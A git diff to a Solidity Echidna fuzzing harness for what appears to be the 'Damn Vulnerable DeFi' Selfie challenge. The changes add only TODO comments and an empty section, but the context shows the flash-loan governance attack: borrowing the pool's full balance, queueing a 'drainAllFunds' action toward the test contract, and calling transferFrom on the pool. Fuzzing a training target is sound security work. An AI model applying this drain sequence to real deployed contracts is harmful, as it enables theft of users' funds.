@@ -59,7 +59,6 @@ contract EchidnaSelfieGeneric {
     }
     uint256 actionsLength = 4; // must correspond with the length of Actions
 
-
     SelfiePool pool;
     SimpleGovernance governance;
     DamnValuableTokenSnapshot token;
@@ -76,7 +75,7 @@ contract EchidnaSelfieGeneric {
 
     function flashLoan() public {
         // borrow max amount of tokens
-        uint256 borrowAmount = token.balanceOf(address(pool));
+        uint256 borrowAmount = token.balanceOf(address(pool)); // TODO: parametrize
         pool.flashLoan(borrowAmount);
     }
 
@@ -150,7 +149,7 @@ contract EchidnaSelfieGeneric {
     }
 
     function queueAction() public {
-        // create payload
+        // create payload -> TODO: parametrize
         bytes memory payload = abi.encodeWithSignature(
             "drainAllFunds(address)",
             address(this)
@@ -158,7 +157,7 @@ contract EchidnaSelfieGeneric {
         // takeSnaphost first as it is needed in queueAction()
         token.snapshot();
         // queue the action
-        actionId = governance.queueAction(address(pool), payload, 0);
+        actionId = governance.queueAction(address(pool), payload, 0); // TODO: parametrize weiAmount
         // set timestamp when action was queued (needed for execute action require)
         timestampActionQueued = block.timestamp;
         // emit event
@@ -198,12 +197,18 @@ contract EchidnaSelfieGeneric {
      */
     function transferFrom() public {
         uint256 _poolBalance = token.balanceOf(address(pool));
-        token.transferFrom(address(pool), address(this), _poolBalance);
+        token.transferFrom(address(pool), address(this), _poolBalance); // TODO: parametrize _poolAmount
         uint256 _poolBalanceAfter = token.balanceOf(address(pool));
         require(_poolBalanceAfter > _poolBalance, "Transfer unsuccessful");
         // emit event
         emit ActionCalled("transferFrom()");
     }
+
+    /////////////
+    // SETTERS //
+    /////////////
+
+    
 
     /////////////
     // HELPERS //
